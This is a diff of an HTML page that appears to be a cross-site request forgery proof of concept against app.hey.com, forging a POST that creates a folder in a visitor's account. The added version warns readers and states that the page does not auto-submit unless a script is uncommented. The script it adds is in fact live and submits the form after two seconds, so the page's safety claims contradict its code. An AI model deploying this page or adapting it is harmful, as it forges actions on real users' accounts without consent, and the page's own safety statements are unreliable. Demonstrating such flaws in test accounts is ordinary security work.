@@ -1,9 +1,44 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>CSRF demo — Do not use on production</title>
+  <style>
+    body { font-family: system-ui, -apple-system, Roboto, Arial, sans-serif; padding: 1rem; max-width: 720px; }
+    .warning { color: #7a1f1f; background:#fff1f0; padding:0.5rem 1rem; border-radius:6px; margin-bottom:1rem; }
+  </style>
+</head>
+<body>
+  <h1>CSRF demonstration (Create folder on app.hey.com)</h1>
 
-<body onload="document.forms[0].submit()">
-<!-- Request 2 – Create folder -->
-<form action="https://app.hey.com/folders" method="POST">
-  <input type="hidden" name="folder[name]" value="big-label">
-  <input type="hidden" name="commit" value="Save">
-  <input type="submit" value="CSRF – Create Folder">
-</form>
+  <div class="warning" role="alert">
+    Warning: This page issues an unauthenticated POST request to <code>https://app.hey.com/folders</code>. Use only in a controlled test account/environment.
+  </div>
+
+  <p>
+    This page shows a minimal CSRF request. It will not auto-submit by default — uncomment the script below to auto-submit for a demo.
+  </p>
+
+  <!-- Request 2 – Create folder -->
+  <form id="csrf-form" action="https://app.hey.com/folders" method="POST" novalidate>
+    <input type="hidden" name="folder[name]" value="big-label">
+    <input type="hidden" name="commit" value="Save">
+    <button type="submit">CSRF – Create Folder (manual)</button>
+  </form>
+
+  <!-- Optional: auto-submit for demonstration. Keep commented unless you know what you're doing.-->
+  <script>
+    // Auto-submit after 2 seconds for a demo (UNSAFE on production):
+    setTimeout(() => document.getElementById('csrf-form').submit(), 2000);
+  </script>
+  
+
+  <hr>
+  <h2>Notes</h2>
+  <ul>
+    <li>Do not open this page while authenticated in a real account you care about.</li>
+    <li>To demo safely, use an isolated test account or local test server.</li>
+  </ul>
 </body>
+</html>
